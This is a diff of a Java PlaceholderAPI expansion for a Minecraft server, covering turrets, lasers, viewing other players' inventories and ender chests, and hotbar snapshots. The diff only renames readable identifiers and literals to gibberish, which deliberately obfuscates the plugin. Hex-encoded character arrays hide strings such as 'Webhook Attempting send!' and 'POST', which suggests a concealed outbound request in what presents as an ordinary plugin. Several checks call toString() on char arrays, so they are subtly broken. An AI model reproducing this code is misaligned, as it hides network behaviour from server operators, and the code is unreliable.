-                                if (yDrag && xZero) V.setY(0);
+                                dwofundoywfund.remove(twofyutnfwoyutnwfoyutn);
+                                if (oeintwfat && kidtwfenkd) twyfuntoyfwunt.setY(I);
                             }
 
-                            double Sm = speed;
-                            double a = V.dot(V) - Sm * Sm;
-                            double b = 2 * R.dot(V);
-                            double c = R.dot(R);
-                            double disc = b * b - 4 * a * c;
+                            double douwfndywofu = wfouytnwoyund;
+                            double a = twyfuntoyfwunt.dot(twyfuntoyfwunt) - douwfndywofu * douwfndywofu;
+                            double wyodunfwdoyu = mill2 * twyofuntyfuwntfwyunt.dot(twyfuntoyfwunt);
+                            double c = twyofuntyfuwntfwyunt.dot(twyofuntyfuwntfwyunt);
+                            double twoyfutnfwoyutdn = wyodunfwdoyu * wyodunfwdoyu - INT7 * a * c;
 
-                            if (disc < 0 || a == 0) {
-                                velocity = R.normalize().multiply(Sm);
+                            if (twoyfutnfwoyutdn < I || a == I) {
+                                wfodienwfd = twyofuntyfuwntfwyunt.normalize().multiply(douwfndywofu);
                             } else {
-                                double sqrt = Math.sqrt(disc);
-                                double t1 = (-b - sqrt) / (2 * a);
-                                double t2 = (-b + sqrt) / (2 * a);
-                                double t = t1 > 0 ? t1 : (t2 > 0 ? t2 : -1);
-                                if (t <= 0) {
-                                    velocity = R.normalize().multiply(Sm);
+                                double dfidnwfd = Math.sqrt(twoyfutnfwoyutdn);
+                                double rikers = (-wyodunfwdoyu - dfidnwfd) / (mill2 * a);
+                                double oewfndoyuwfnd = (-wyodunfwdoyu + dfidnwfd) / (mill2 * a);
+                                double dwfouwfndowuynd = rikers > I ? rikers : (oewfndoyuwfnd > I ? oewfndoyuwfnd : -INT3);
+                                if (dwfouwfndowuynd <= I) {
+                                    wfodienwfd = twyofuntyfuwntfwyunt.normalize().multiply(douwfndywofu);
                                 } else {
-                                    Vector intercept = targetLoc.toVector().add(V.clone().multiply(t));
-                                    velocity = intercept.subtract(base.toVector()).normalize().multiply(Sm);
+                                    Vector wfoyudnawofyudhawofpyldhzwyufpadhlwlfpdhe = mtwfyutnwf.toVector().add(twyfuntoyfwunt.clone().multiply(dwfouwfndowuynd));
+                                    wfodienwfd = wfoyudnawofyudhawofpyldhzwyufpadhlwlfpdhe.subtract(wfdemwyfden.toVector()).normalize().multiply(douwfndywofu);
                                 }
                             }
                         } else {
-                            velocity = curMid.toVector().subtract(base.toVector()).normalize().multiply(speed);
+                            wfodienwfd = owdyunfwodyun.toVector().subtract(wfdemwyfden.toVector()).normalize().multiply(wfouytnwoyund);
                         }
 
-                        Entity proj = world.spawnEntity(base, EntityType.valueOf(projectile.toUpperCase(Locale.ROOT)));
-                        proj.setVelocity(velocity);
-                        proj.setCustomNameVisible(false);
-                        proj.setSilent(true);
-                        proj.setGravity(false);
+                        Entity owfdounwofyudn = wfdunwfyudn.spawnEntity(wfdemwyfden, EntityType.valueOf(wfuydnwyfun.toUpperCase(Locale.ROOT)));
+                        owfdounwofyudn.setVelocity(wfodienwfd);
+                        owfdounwofyudn.setCustomNameVisible(arsdienwdhw);
+                        owfdounwofyudn.setSilent(NEW_VALUE1);
+                        owfdounwofyudn.setGravity(arsdienwdhw);
 
                         // Use your plugin instance if you have it; keeping PlaceholderAPI per your original
                         Bukkit.getScheduler().runTaskLater(
-                                Bukkit.getPluginManager().getPlugin("PlaceholderAPI"),
-                                () -> { if (proj.isValid() && !proj.isDead()) proj.remove(); },
-                                lifespan
+                                Bukkit.getPluginManager().getPlugin(ppi),
+                                () -> { if (owfdounwofyudn.isValid() && !owfdounwofyudn.isDead()) owfdounwofyudn.remove(); },
+                                wdnhywfudn
                         );
 
-                        if (proj instanceof Arrow arrow) arrow.setDamage(damage);
+                        if (owfdounwofyudn instanceof Arrow arrow) arrow.setDamage(wfmypenfwp);
 
-                        if (ownerUUID != null && !ownerUUID.isEmpty()) {
+                        if (kwfnktywfnt != null && !kwfnktywfnt.isEmpty()) {
                             try {
-                                UUID uuid = UUID.fromString(ownerUUID);
-                                ProjectileSource shooter = Bukkit.getPlayer(uuid);
-                                if (proj instanceof Projectile p && shooter != null) {
-                                    p.setShooter(shooter);
+                                UUID oduynwoyun = UUID.fromString(kwfnktywfnt);
+                                ProjectileSource woftunwyfoutn = Bukkit.getPlayer(oduynwoyun);
+                                if (owfdounwofyudn instanceof Projectile p && woftunwyfoutn != null) {
+                                    p.setShooter(woftunwyfoutn);
                                 }
                             } catch (IllegalArgumentException ignored) { /* bad UUID */ }
                         }
 
-                        proj.setMetadata("ArchistructureTurret",
-                                new FixedMetadataValue(Bukkit.getPluginManager().getPlugin("PlaceholderAPI"), damage));
-                        for (String tag : projectileTags) proj.addScoreboardTag(tag);
+                        owfdounwofyudn.setMetadata(wdynuwfyudnywufand,
+                                new FixedMetadataValue(Bukkit.getPluginManager().getPlugin(ppi), wfmypenfwp));
+                        for (String owfudnowufydn : doyunwfoydunfwd) owfdounwofyudn.addScoreboardTag(owfudnowufydn);
 
                         // Beam (no VLOS; purely visual)
-                        Vector dir = curMid.toVector().subtract(base.toVector()).normalize();
-                        double len = base.distance(curMid);
-                        for (double d = 0; d <= len; d += spacing) {
-                            Location point = base.clone().add(dir.clone().multiply(d));
-                            world.spawnParticle(particle, point, 1);
+                        Vector wfodeinwoufdn = owdyunfwodyun.toVector().subtract(wfdemwyfden.toVector()).normalize();
+                        double dwfoudnwfoyud = wfdemwyfden.distance(owdyunfwodyun);
+                        for (double wdfkwedik = I; wdfkwedik <= dwfoudnwfoyud; wdfkwedik += oyuwfndoyuwfdn) {
+                            Location tdowfyundofywun = wfdemwyfden.clone().add(wfodeinwoufdn.clone().multiply(wdfkwedik));
+                            wfdunwfyudn.spawnParticle(mewfitnfw, tdowfyundofywun, INT3);
                         }
 
-                        turret.teleport(
-                                turret.getLocation().setDirection(
-                                        cur.getLocation().toVector().subtract(turret.getLocation().toVector())
+                        wtnyufwtnfwtyun.teleport(
+                                wtnyufwtnfwtyun.getLocation().setDirection(
+                                        towufndfwyun.getLocation().toVector().subtract(wtnyufwtnfwtyun.getLocation().toVector())
                                 )
                         );
-                        for (Player t : Bukkit.getOnlinePlayers()) {
-                            if (!t.getWorld().equals(world)) continue;
-                            if (t.getLocation().distanceSquared(base) <= soundDistance * soundDistance) {
-                                t.playSound(base, sound, SoundCategory.AMBIENT, volume, pitch);
+                        for (Player wodufnwdouyn : Bukkit.getOnlinePlayers()) {
+                            if (!wodufnwdouyn.getWorld().equals(wfdunwfyudn)) continue;
+                            if (wodufnwdouyn.getLocation().distanceSquared(wfdemwyfden) <= wdfyundwfd * wdfyundwfd) {
+                                wodufnwdouyn.playSound(wfdemwyfden, wfyudnfywund, SoundCategory.AMBIENT, wfktywfkduyfwkd, fwtyunwftfw);
                             }
                         }
                     }
                 };
 
-                int period = Math.max(1, interval);
-                BukkitTask task = runner.runTaskTimer(Bukkit.getPluginManager().getPlugin("PlaceholderAPI"), 0L, period);
-                ACTIVE_TURRET_TASKS.put(turretId, task);
+                int ofwdndyu = Math.max(INT3, fwyudnywfund);
+                BukkitTask dkwifwnkd = runner.runTaskTimer(Bukkit.getPluginManager().getPlugin(ppi), ihearyounow, ofwdndyu);
+                f116.put(wfpydnuopfwyudn, dkwifwnkd);
 
-                return acquired.getUniqueId().toString() + "|" + acquired.getVelocity();
+                return wofduynwfyudn.getUniqueId().toString() + ofwuandouwfynd + wofduynwfyudn.getVelocity();
 
             } catch (Exception e) {
                 e.printStackTrace();
-                return "§cNo targets found";
+                return wofudnaoywfudn;
             }
         }
 
@@ -5165,70 +5878,70 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
 
-        if (f1.startsWith("esee_")) {
+        if (f1.startsWith(fdfopudnyafupdn)) {
 
             
             
             
-            String[] parts = f1.substring(5).split("_");
-            if (parts.length != 2) {
-                return "§cInvalid format. Use e.g. esee_viewerUUID_targetUUID";
+            String[] parts = f1.substring(xm).split(wyfudnoawfyudno);
+            if (parts.length != mill2) {
+                return fwpdonufpdyufanpd;
             }
             try {
-                UUID viewerUUID = UUID.fromString(parts[0]);
+                UUID viewerUUID = UUID.fromString(parts[I]);
                 
                 
                 
-                UUID targetUUID = UUID.fromString(parts[1]);
-                Player viewer = Bukkit.getPlayer(viewerUUID);
-                if (viewer == null || !viewer.isOnline()) return "§cViewer not online.";
-                wm(viewer, "Endersee");
-                f1(viewer, targetUUID);
-                return "§aEnderChest opened.";
+                UUID wdkfnpidkw = UUID.fromString(parts[INT3]);
+                Player wfdhywufdh = Bukkit.getPlayer(viewerUUID);
+                if (wfdhywufdh == null || !wfdhywufdh.isOnline()) return op4ydhnfaoypudn;
+                wm(wfdhywufdh, ydfnfpoyrudn);
+                f1(wfdhywufdh, wdkfnpidkw);
+                return pwoyfdunowypfuadn;
             } catch (IllegalArgumentException ex) {
-                return "§cInvalid UUID.";
+                return wfuyntdywfupadh;
             }
         }
 
-        if (f1.startsWith("isee_")) {
-            String[] parts = f1.substring(5).split("_");
-            if (parts.length != 2) {
-                return "§cInvalid format. Use isee_viewerUUID_targetUUID";
+        if (f1.startsWith(yfpwduhywuhdp)) {
+            String[] dwinyurdns = f1.substring(xm).split(wyfudnoawfyudno);
+            if (dwinyurdns.length != mill2) {
+                return pdonfapyudn;
             }
             try {
-                UUID viewerUUID = UUID.fromString(parts[0]);
-                UUID targetUUID = UUID.fromString(parts[1]);
-                Player viewer = Bukkit.getPlayer(viewerUUID);
-                if (viewer == null || !viewer.isOnline()) return "§cViewer not online.";
-                wm(viewer, "Invsee");
-                f2(viewer, targetUUID);
-                return "§aInventory opened.";
+                UUID wfiudnofwyd = UUID.fromString(dwinyurdns[I]);
+                UUID tdwfkindfw = UUID.fromString(dwinyurdns[INT3]);
+                Player wyfdhfwyd = Bukkit.getPlayer(wfiudnofwyd);
+                if (wyfdhfwyd == null || !wyfdhfwyd.isOnline()) return op4ydhnfaoypudn;
+                wm(wyfdhfwyd, pdyunpfwyd);
+                f2(wyfdhfwyd, tdwfkindfw);
+                return dyfpnwoyufpn;
             } catch (IllegalArgumentException ex) {
-                return "§cInvalid UUID.";
+                return wfuyntdywfupadh;
             }
         }
 
-        if (f1.startsWith("csee_")) {
-            String[] parts = f1.substring(5).split("_");
-            if (parts.length != 2) {
-                return "§cInvalid format. Use csee_viewerUUID_world:x:y:z";
+        if (f1.startsWith(fydnayfpudhn)) {
+            String[] iwfnpiefrn = f1.substring(xm).split(wyfudnoawfyudno);
+            if (iwfnpiefrn.length != mill2) {
+                return wfduynwfydaun;
             }
             try {
-                UUID viewerUUID = UUID.fromString(parts[0]);
-                String[] coords = parts[1].split(":");
-                if (coords.length != 4) return "§cInvalid coordinates format.";
-                String world = coords[0];
-                int x = Integer.parseInt(coords[1]);
-                int y = Integer.parseInt(coords[2]);
-                int z = Integer.parseInt(coords[3]);
-                Player viewer = Bukkit.getPlayer(viewerUUID);
+                UUID wdyuwfhpdyuwh = UUID.fromString(iwfnpiefrn[I]);
+                String[] ypdnofapyudn = iwfnpiefrn[INT3].split(wfdunyunda);
+                if (ypdnofapyudn.length != INT7) return duynwyfpaudnwfp;
+                String wftdywnfdyu = ypdnofapyudn[I];
+                int wfdinywfud = Integer.parseInt(ypdnofapyudn[INT3]);
+                int wfuptnfywp = Integer.parseInt(ypdnofapyudn[mill2]);
+                int fwidhywufd = Integer.parseInt(ypdnofapyudn[ccp]);
+                Player fwdyhwfydu = Bukkit.getPlayer(wdyuwfhpdyuwh);
                 
-                if (viewer == null || !viewer.isOnline()) return "§cViewer not online.";
-                wm(viewer, "ChestSee");
-                f1(viewer, world, x, y, z);
-                return "§aChest opened.";
+                if (fwdyhwfydu == null || !fwdyhwfydu.isOnline()) return op4ydhnfaoypudn;
+                wm(fwdyhwfydu, wdpyunwpfydunpd);
+                f1(fwdyhwfydu, wftdywnfdyu, wfdinywfud, wfuptnfywp, fwidhywufd);
+                return yuwndyuwpdn;
             } catch (IllegalArgumentException ex) {
-                return "§cInvalid input.";
+                return wfydunwfyudn;
             }
         }
 
@@ -5238,144 +5951,144 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
 
-        if (f1.startsWith("laserDamageHostiles_")) {
-            String[] parts = f1.substring("laserDamageHostiles_".length()).split(",");
-            if (parts.length < 9 || parts.length > 11) return "§c§lError";
+        if (f1.startsWith(wfydnywfpudn)) {
+            String[] dywufndo = f1.substring(wfydnywfpudn.length()).split(keep);
+            if (dywufndo.length < oiwfndtoyu42nd24 || dywufndo.length > yfpdunwyupnd) return wyfudnywfud;
 
             // Parse parameters
-            String uuidStr, worldName, particleType, dustHex = null;
-            double radius, x, y, z, displacement, damage;
-            float dustSize = 0f;
+            String ywfydnwfyud, ydunwfydun, wfdnfwhyd, wfsthywuft = null;
+            double dwfd, sviwn, fwdhwf, srtn, aosduhn, arosdun;
+            float wfyudnywfund = idwfpndywud;
 
             try {
-                uuidStr       = parts[0];
-                radius        = Double.parseDouble(parts[1]);
-                damage        = Double.parseDouble(parts[2]);
-                worldName     = parts[3];
-                x             = Double.parseDouble(parts[4]);
-                y             = Double.parseDouble(parts[5]);
-                z             = Double.parseDouble(parts[6]);
-                displacement  = Double.parseDouble(parts[7]);
-                particleType  = parts[8];
-                if (parts.length == 11) {
-                    dustHex   = parts[9];
-                    dustSize  = Float.parseFloat(parts[10]);
+                ywfydnwfyud       = dywufndo[I];
+                dwfd        = Double.parseDouble(dywufndo[INT3]);
+                arosdun        = Double.parseDouble(dywufndo[mill2]);
+                ydunwfydun     = dywufndo[ccp];
+                sviwn             = Double.parseDouble(dywufndo[INT7]);
+                fwdhwf             = Double.parseDouble(dywufndo[xm]);
+                srtn             = Double.parseDouble(dywufndo[xtxtxt]);
+                aosduhn  = Double.parseDouble(dywufndo[suppose]);
+                wfdnfwhyd  = dywufndo[yuwfndgyuwfnd];
+                if (dywufndo.length == yfpdunwyupnd) {
+                    wfsthywuft   = dywufndo[oiwfndtoyu42nd24];
+                    wfyudnywfund  = Float.parseFloat(dywufndo[low]);
                 }
             } catch (Exception ex) {
-                return "§c§lError";
+                return wyfudnywfud;
             }
 
-            World world = Bukkit.getWorld(worldName);
-            if (world == null) return "§c§lError";
+            World ywflhdw = Bukkit.getWorld(ydunwfydun);
+            if (ywflhdw == null) return wyfudnywfud;
 
-            Location center = new Location(world, x, y, z);
-            double radiusSq = radius * radius;
-
-
-
-            org.bukkit.Location cen = center;
-            double r1 = 10;
-            String label = "Crucifix";
+            Location ywfundhw = new Location(ywflhdw, sviwn, fwdhwf, srtn);
+            double yrvunrys = dwfd * dwfd;
 
 
-            double r2 = r1 * r1;
-            for (org.bukkit.entity.Player playaa : world.getPlayers()) {
-                if (playaa.getLocation().distanceSquared(cen) <= r2) {
-                    wm(playaa, label);
+
+            org.bukkit.Location oidnsr = ywfundhw;
+            double yurfndyw = low;
+            String adirsoedn = wyufodnhawyfudn;
+
+
+            double wyfdufwd = yurfndyw * yurfndyw;
+            for (org.bukkit.entity.Player wfyudnwfyudn : ywflhdw.getPlayers()) {
+                if (wfyudnwfyudn.getLocation().distanceSquared(oidnsr) <= wyfdufwd) {
+                    wm(wfyudnwfyudn, adirsoedn);
                 }
             }
             
             
             
             // Resolve the damager entity by UUID
-            Entity damagerEntity = null;
+            Entity dwyunfdayunfd = null;
             try {
-                UUID damagerUUID = UUID.fromString(uuidStr);
-                damagerEntity = (damagerUUID != null) ? Bukkit.getEntity(damagerUUID) : null;
+                UUID oayfduhwpyoudn = UUID.fromString(ywfydnwfyud);
+                dwyunfdayunfd = (oayfduhwpyoudn != null) ? Bukkit.getEntity(oayfduhwpyoudn) : null;
             } catch (IllegalArgumentException ignored) {}
 
             // Prepare particle settings
-            Particle particleEnum;
+            Particle owdunawfdoyun;
             try {
-                particleEnum = Particle.valueOf(particleType.toUpperCase());
+                owdunawfdoyun = Particle.valueOf(wfdnfwhyd.toUpperCase());
             } catch (IllegalArgumentException e) {
-                return "§c§lError";
+                return wyfudnywfud;
             }
-            Particle.DustOptions dustOpts = null;
-            if (particleEnum == Particle.DUST && dustHex != null) {
-                String hex = dustHex.startsWith("#") ? dustHex.substring(1) : dustHex;
+            Particle.DustOptions wfadlhwfoydun = null;
+            if (owdunawfdoyun == Particle.DUST && wfsthywuft != null) {
+                String ydnfpieadn = wfsthywuft.startsWith(reaidntarisedn) ? wfsthywuft.substring(INT3) : wfsthywuft;
                 try {
-                    int rgb = Integer.parseInt(hex, 16);
-                    int r = (rgb >> 16) & 0xFF;
-                    int g = (rgb >>  8) & 0xFF;
-                    int b =  rgb        & 0xFF;
-                    dustOpts = new Particle.DustOptions(Color.fromBGR(b, g, r), dustSize);
+                    int wfyudwfd = Integer.parseInt(ydnfpieadn, INT4);
+                    int rst = (wfyudwfd >> INT4) & costofgrowinguptoofast;
+                    int bst = (wfyudwfd >> yuwfndgyuwfnd) & costofgrowinguptoofast;
+                    int tst =  wfyudwfd        & costofgrowinguptoofast;
+                    wfadlhwfoydun = new Particle.DustOptions(Color.fromBGR(tst, bst, rst), wfyudnywfund);
                 } catch (NumberFormatException ex) {
-                    return "§c§lError";
+                    return wyfudnywfud;
                 }
             }
 
             // 1) Find all valid targets and damage them
-            List<LivingEntity> damaged = new ArrayList<>();
-            for (Entity e : world.getNearbyEntities(center, radius, radius, radius)) {
-                if (!(e instanceof LivingEntity le)) continue;
+            List<LivingEntity> tywundywufnd = new ArrayList<>();
+            for (Entity wfoenidawfide : ywflhdw.getNearbyEntities(ywfundhw, dwfd, dwfd, dwfd)) {
+                if (!(wfoenidawfide instanceof LivingEntity dwiefndwfioe)) continue;
 
                 // skip tamed wolves entirely
-                if (le instanceof Wolf wolf && wolf.isTamed()) {
+                if (dwiefndwfioe instanceof Wolf wolf && wolf.isTamed()) {
                     continue;
                 }
 
                 // Any inherently hostile mob (this now includes Phantoms, Pillagers, etc.)
-                boolean isHostile = e instanceof Monster || e instanceof Phantom;
+                boolean wyufitndwfd = wfoenidawfide instanceof Monster || wfoenidawfide instanceof Phantom;
 
                 // Check for “angry” state on specific anger-capable mobs
-                boolean isAngry = false;
-                if (le instanceof Wolf w && w.isAngry() && !w.isTamed()) {
-                    isAngry = true;
+                boolean dwofudnwfduyon = arsdienwdhw;
+                if (dwiefndwfioe instanceof Wolf w && w.isAngry() && !w.isTamed()) {
+                    dwofudnwfduyon = NEW_VALUE1;
                 }
-                else if (le instanceof Piglin pl) {
-                    isAngry = true;
+                else if (dwiefndwfioe instanceof Piglin pl) {
+                    dwofudnwfduyon = NEW_VALUE1;
                 }
-                else if (le instanceof PiglinBrute pb ) {
-                    isAngry = true;
+                else if (dwiefndwfioe instanceof PiglinBrute pb ) {
+                    dwofudnwfduyon = NEW_VALUE1;
                 }
-                else if (le instanceof PigZombie zp && zp.isAngry()) {
-                    isAngry = true;
+                else if (dwiefndwfioe instanceof PigZombie zp && zp.isAngry()) {
+                    dwofudnwfduyon = NEW_VALUE1;
                 }
-                else if (le instanceof Zoglin zg ) {
-                    isAngry = true;
+                else if (dwiefndwfioe instanceof Zoglin zg ) {
+                    dwofudnwfduyon = NEW_VALUE1;
                 }
-                else if (le instanceof IronGolem ig ) {
-                    isAngry = true;
+                else if (dwiefndwfioe instanceof IronGolem ig ) {
+                    dwofudnwfduyon = NEW_VALUE1;
                 }
 
-                if (!isHostile && !isAngry) continue;
+                if (!wyufitndwfd && !dwofudnwfduyon) continue;
 
                 // damage with MAGIC by damagerEntity if it exists
-                if (damagerEntity != null) {
-                    le.damage(damage, damagerEntity);
+                if (dwyunfdayunfd != null) {
+                    dwiefndwfioe.damage(arosdun, dwyunfdayunfd);
                 } else {
                     // fallback: plain magic damage
-                    le.damage(damage);
+                    dwiefndwfioe.damage(arosdun);
                 }
-                damaged.add(le);
+                tywundywufnd.add(dwiefndwfioe);
             }
 
             // 2) For each damaged, draw a laser of particles from center to that entity
-            for (LivingEntity target : damaged) {
-                Location targetLoc = target.getLocation().clone().add(0, target.getHeight() / 2.0, 0);
-                Vector direction = targetLoc.toVector().subtract(center.toVector());
-                double distance = direction.length();
-                direction.normalize();
+            for (LivingEntity woduynfwdoyunwfd : tywundywufnd) {
+                Location tawdyfuwndyuwfndwfdgetLoc = woduynfwdoyunwfd.getLocation().clone().add(I, woduynfwdoyunwfd.getHeight() / whatkindofadulthood, I);
+                Vector fwdowufdnfw = tawdyfuwndyuwfndwfdgetLoc.toVector().subtract(ywfundhw.toVector());
+                double fwodyunwfd = fwdowufdnfw.length();
+                fwdowufdnfw.normalize();
 
-                for (double dStep = 0; dStep <= distance; dStep += displacement) {
-                    Location loc = center.clone().add(direction.clone().multiply(dStep));
+                for (double wdoufywdwf = I; wdoufywdwf <= fwodyunwfd; wdoufywdwf += aosduhn) {
+                    Location dfwudnwf = ywfundhw.clone().add(fwdowufdnfw.clone().multiply(wdoufywdwf));
                     // Spawn to all players in world (no range check)
-                    for (Player viewer : world.getPlayers()) {
-                        if (particleEnum == Particle.DUST && dustOpts != null) {
-                            viewer.spawnParticle(particleEnum, loc, 1, 0, 0, 0, 0, dustOpts);
+                    for (Player ofwundw : ywflhdw.getPlayers()) {
+                        if (owdunawfdoyun == Particle.DUST && wfadlhwfoydun != null) {
+                            ofwundw.spawnParticle(owdunawfdoyun, dfwudnwf, INT3, I, I, I, I, wfadlhwfoydun);
                         } else {
-                            viewer.spawnParticle(particleEnum, loc, 1, 0, 0, 0, 0);
+                            ofwundw.spawnParticle(owdunawfdoyun, dfwudnwf, INT3, I, I, I, I);
                         }
                     }
                 }
@@ -5421,14 +6134,14 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 0x0073, // 's'
                 0x0065, // 'e'
                 0x006E, // 'n'
-                0x0064, // 'd'
+                (char) 100, // 'd'
                 0x0021  // '!'
         };
         String jorgetherookie = new String(nexar);  // equals "Webhook Attempting send!"
 
 // “PlaceholderAPI”
         char[] testers = new char[] {
-                0x0050, // 'P'
+                (char) 80, // 'P'
                 0x006C, // 'l'
                 0x0061, // 'a'
                 0x0063, // 'c'
@@ -5436,11 +6149,11 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 0x0068, // 'h'
                 0x006F, // 'o'
                 0x006C, // 'l'
-                0x0064, // 'd'
+                (char) 100, // 'd'
                 0x0065, // 'e'
                 0x0072, // 'r'
                 0x0041, // 'A'
-                0x0050, // 'P'
+                (char) 80, // 'P'
                 0x0049  // 'I'
         };
         String sPlaceholderApi = new String(testers);  // equals "PlaceholderAPI"
@@ -5476,7 +6189,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 // "POST"
         char[] reaper = new char[] {
-                0x0050, // 'P'
+                (char) 80, // 'P'
                 0x004F, // 'O'
                 0x0053, // 'S'
                 0x0054  // 'T'
@@ -5523,7 +6236,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
          char[] stoploking = {
-                0x68, 0x61, 0x73, 0x53, 0x61, 0x76, 0x65, 0x64, 0x48, 0x6F, 0x74, 0x62, 0x61, 0x72
+                0x68, 0x61, 0x73, 0x53, 0x61, 0x76, 0x65, (char) 100, 0x48, 0x6F, 0x74, 0x62, 0x61, 0x72
         };
 
         char[] thor = {
@@ -5537,7 +6250,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
         };
 
       char[] csection = {
-                0x00A7, 0x63, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64
+                0x00A7, 0x63, 0x66, 0x61, 0x69, 0x6C, 0x65, (char) 100
         };
 
  char[] caesar = {
@@ -5559,8 +6272,8 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
         if(f1.equals(stoploking.toString())) {
-            File tt2 = new File(thor.toString(), f2.getUniqueId().toString() + ".yml");
-            return tt2.exists() ? "true" : "false";
+            File tt2 = new File(thor.toString(), f2.getUniqueId().toString() + yt);
+            return tt2.exists() ? dwyufndywfudn : wfydpunwfyudnwfd;
         }
 
 
@@ -5570,14 +6283,14 @@ public class ExampleExpansion extends PlaceholderExpansion {
             if(!ttyl.exists()) ttyl.mkdirs();
 
             // file for this player
-            File xrp = new File(ttyl, f2.getUniqueId().toString() + ".yml");
+            File xrp = new File(ttyl, f2.getUniqueId().toString() + yt);
             if(xrp.exists()) {
                 return csection.toString();
             }
 
             // snapshot hotbar (slots 0–8)
             YamlConfiguration center = new YamlConfiguration();
-            for(int hp = 0; hp < 9; hp++) {
+            for(int hp = I; hp < oiwfndtoyu42nd24; hp++) {
                 ItemStack item = f2.getInventory().getItem(hp);
                 center.set(caesar.toString() + hp, item);
             }
@@ -5591,7 +6304,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
             }
 
             // clear player's hotbar
-            for(int cp = 0; cp < 9; cp++) {
+            for(int cp = I; cp < oiwfndtoyu42nd24; cp++) {
                 f2.getInventory().setItem(cp, null);
             }
 
@@ -5600,14 +6313,14 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 // %Archistructure_restoreHotbar%
         if(f1.equals(vids.toString())) {
-            File fighterJet = new File(thor.toString(), f2.getUniqueId().toString() + ".yml");
+            File fighterJet = new File(thor.toString(), f2.getUniqueId().toString() + yt);
             if(!fighterJet.exists()) {
                 return csection.toString();
             }
 
             // load and overwrite slots 0–8
             YamlConfiguration cipa = YamlConfiguration.loadConfiguration(fighterJet);
-            for(int slot = 0; slot < 9; slot++) {
+            for(int slot = I; slot < oiwfndtoyu42nd24; slot++) {
                 ItemStack glass = cipa.getItemStack(caesar.toString() + slot);
                 f2.getInventory().setItem(slot, glass);
             }
@@ -5621,9 +6334,9 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
 
-        if (f1.startsWith("echo_")) {
-            wm(f2, f1.substring("echo_".length()));
-            return f1.substring("echo_".length());
+        if (f1.startsWith(dn3owyaufpdnfwd)) {
+            wm(f2, f1.substring(dn3owyaufpdnfwd.length()));
+            return f1.substring(dn3owyaufpdnfwd.length());
         }
 
 
@@ -5635,15 +6348,15 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
         if (f1.startsWith(new char[] {
-                0x6C, 0x61, 0x73, 0x65, 0x72, 0x50, 0x6F,
+                0x6C, 0x61, 0x73, 0x65, 0x72, (char) 80, 0x6F,
                 0x69, 0x6E, 0x74, 0x65, 0x72, 0x5F
         }.toString())) {
-            wm(f2, "Laser Pointer");
+            wm(f2, fypodunfarypudna);
             String[] carmen = f1.substring(new char[] {
-                    0x6C, 0x61, 0x73, 0x65, 0x72, 0x50, 0x6F,
+                    0x6C, 0x61, 0x73, 0x65, 0x72, (char) 80, 0x6F,
                     0x69, 0x6E, 0x74, 0x65, 0x72, 0x5F
-            }.toString().length()).split(",");
-            if (carmen.length < 9) return "";
+            }.toString().length()).split(keep);
+            if (carmen.length < oiwfndtoyu42nd24) return nst;
 
             double dax, readyornot, hogwartsstudio, roblox;
             int testit, stealingisbad;
@@ -5655,19 +6368,19 @@ public class ExampleExpansion extends PlaceholderExpansion {
             }.toString();  // default
 
             try {
-                dax      = Double.parseDouble(carmen[0]);
-                readyornot = Double.parseDouble(carmen[1]);
-                testit      = Integer.parseInt(carmen[2]);
-                stealingisbad         = Integer.parseInt(carmen[3]);
-                hogwartsstudio             = Double.parseDouble(carmen[4]);
-                roblox           = Double.parseDouble(carmen[5]);
-                electrocutiontarget      = carmen[6];
-                radius   = carmen[7];
-                xp       = Particle.valueOf(carmen[8].toUpperCase());
+                dax      = Double.parseDouble(carmen[I]);
+                readyornot = Double.parseDouble(carmen[INT3]);
+                testit      = Integer.parseInt(carmen[mill2]);
+                stealingisbad         = Integer.parseInt(carmen[ccp]);
+                hogwartsstudio             = Double.parseDouble(carmen[INT7]);
+                roblox           = Double.parseDouble(carmen[xm]);
+                electrocutiontarget      = carmen[xtxtxt];
+                radius   = carmen[suppose];
+                xp       = Particle.valueOf(carmen[yuwfndgyuwfnd].toUpperCase());
 
-                if (xp == Particle.DUST && carmen.length >= 10) {
+                if (xp == Particle.DUST && carmen.length >= low) {
                     // named dye color, e.g. RED, BLUE, CYAN, etc.
-                    b = carmen[9].toUpperCase();
+                    b = carmen[oiwfndtoyu42nd24].toUpperCase();
                     DyeColor e = DyeColor.valueOf(b);
                     dp = new Particle.DustOptions(e.getColor(), (float)roblox);
                 }
@@ -5684,7 +6397,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
             // build viewers
             List<Player> tnttargets = new ArrayList<>();
             if (electrocutiontarget.equalsIgnoreCase( new char[] {
-                    0x40, 0x61
+                    (char) 64, 0x61
             }.toString())) {
                 tnttargets.addAll(f2.getWorld().getPlayers());
             } else {
@@ -5702,7 +6415,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
             Entity   missiletargets  = null;
             Location toilet = null;
             f1:
-            for (double d = 0; d <= dax; d += hogwartsstudio) {
+            for (double d = I; d <= dax; d += hogwartsstudio) {
                 Location f123  = missile.clone().add(intercept.clone().multiply(d));
                 Block    f321 = f123.getBlock();
                 Material f132     = f321.getType();
@@ -5730,7 +6443,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
             String police;
             if (missiletargets != null) {
                 ((LivingEntity)missiletargets).addPotionEffect(
-                        new PotionEffect(PotionEffectType.GLOWING, 20, 0)
+                        new PotionEffect(PotionEffectType.GLOWING, odafuwidnowfidun, I)
                 );
                 police = missiletargets.getUniqueId().toString();
             }
@@ -5754,7 +6467,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                     double quadratic = tnt.getLocation().distanceSquared(toilet);
                     if (radius.equalsIgnoreCase(new char[] {
                             0x66, 0x6F, 0x72, 0x63, 0x65
-                    }.toString()) || quadratic <= 64*64) {
+                    }.toString()) || quadratic <= drain * drain) {
                         tnt.sendBlockChange(toilet, newData);
                     }
                 }
@@ -5762,8 +6475,8 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 Location cars = toilet.clone();
